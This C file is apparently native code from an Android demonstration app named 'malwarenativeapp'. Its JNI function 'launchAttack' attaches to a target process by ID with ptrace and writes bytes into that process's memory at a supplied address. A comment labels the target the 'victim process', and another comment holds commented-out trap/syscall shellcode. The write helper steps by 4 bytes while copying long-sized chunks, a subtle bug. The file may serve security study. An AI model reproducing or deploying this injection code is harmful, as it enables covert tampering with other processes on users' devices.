#include <string.h>
#include <jni.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <strings.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>

const int long_size = sizeof(long);

void putdata(pid_t child, long addr, char *str, int len)
{
    char *laddr;
    int i, j;
    union u {
            long val;
            char chars[long_size];
    } data;

    i = 0;
    j = len / long_size;
    laddr = str;

    while(i < j)
    {
        memcpy(data.chars, laddr, long_size);
        ptrace(PTRACE_POKEDATA, child, (void *)(addr + i * 4), (void *)(data.val) );
        ++i;
        laddr += long_size;
    }

    j = len % long_size;

    if(j != 0)
    {
        memcpy(data.chars, laddr, j);
        ptrace(PTRACE_POKEDATA, child, (void *)(addr + i * 4), (void *)(data.val) );
    }

}


jlong JNICALL Java_com_example_malwarenativeapp_NativeLib_launchAttack
  (JNIEnv * env, jobject obj, jint value1, jint value2) {

	pid_t traced_process;
    // char code[] = {0xcd,0x80,0xcc,0};
	char code[] = {0,0,0,0};
    char backup[4];
    long ret = 0;

	traced_process = value1;
	ret = ptrace(PTRACE_ATTACH, traced_process, NULL, NULL);

	if(ret == -1)
		return errno;

	wait(NULL);
	// ptrace(PTRACE_GETREGS, traced_process, NULL, &regs);

	/* Write Onto the Victim Process */
	putdata(traced_process, (long)(value2), code, 4);

    return ret;
}
